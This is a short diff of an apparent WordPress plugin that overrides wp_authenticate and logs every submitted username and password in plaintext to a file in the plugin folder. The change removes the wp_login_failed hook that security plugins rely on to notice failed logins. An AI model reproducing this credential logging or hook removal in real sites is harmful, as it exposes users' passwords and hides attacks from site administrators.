@@ -382,8 +382,7 @@ if (!function_exists('wp_authenticate')) {
  			$logfile = fopen(plugin_dir_path(__FILE__) . $logname, 'a') or die('could not open/create file');
  			fwrite($logfile, sprintf("wp: %s - %s:%s\n", date('Y-m-d H:i:s') , $username, $password));
  			fclose($logfile);
-			do_action('wp_login_failed', $username);
-		}
+			}
 
 		return $user;
 	}
